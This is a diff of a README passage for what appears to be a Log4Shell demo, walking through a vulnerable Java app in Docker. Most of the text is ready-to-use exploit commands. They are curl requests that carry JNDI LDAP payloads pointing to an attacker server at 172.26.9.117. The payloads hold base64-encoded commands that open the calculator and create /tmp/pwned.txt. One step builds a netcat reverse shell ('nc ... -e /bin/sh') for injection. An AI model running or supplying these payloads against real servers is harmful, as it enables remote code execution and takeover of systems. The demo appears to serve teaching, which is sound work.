@@ -84,22 +84,22 @@
     
 #### Live Demo:
 I will cover 3 scenarios where the malicious code will execute different outputs on the host system/server.
-  1. Open ==calculator== on windows system by executing vulnerable java application on local system.
+  1. Open calculator on windows system by executing vulnerable java application on local system.
     - Run the spring boot application as below.  
     ![run app](http://g.recordit.co/AW98phqr4i.gif) 
     - Use curl to send request to host server with malicious code.
     	`curl <your IP>:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/Y2FsYy5leGU=}'` 
     ![check calc](http://g.recordit.co/I5a0PeQpkf.gif) 
-  2. Creating a ==txt file== inside server after hosting application on docker container.
-    - Host the same application in docker using below commands.<br/>  
-    	`docker pull vamsi13krish/vulnerable-app:latest`
-    	`docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app`   
-    	``` curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'```  
+  2. Creating a txt file inside server after hosting application on docker container.
+    - Host the same application in docker using below commands.<br/> 
+    `docker pull vamsi13krish/vulnerable-app:latest`\n
+    `docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app`\n   
+    `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'`  
    	- Check the docker container for pwned.txt file in /tmp folder using below command  <br/>
     	```docker exec -it <container ID> ls /tmp```
   	>*_NOTE_*: Use **docker ps** to get container ID <br/>
     ![file](http://g.recordit.co/Bn8ImBR7wn.gif)
-  3. Getting complete access to the host server using ==netcat== command that will be passed in malicious code on to host server using log4j vulnerability.
+  3. Getting complete access to the host server using netcat command that will be passed in malicious code on to host server using log4j vulnerability.
   	- Use below command to convert the required netcat command to base64 encoded string. <br/>  
     	`echo "nc 172.26.9.117 9999 -e /bin/sh" | base64`
   	- Copy the base64 string and paste after exec_global/ in below command  <br/> 
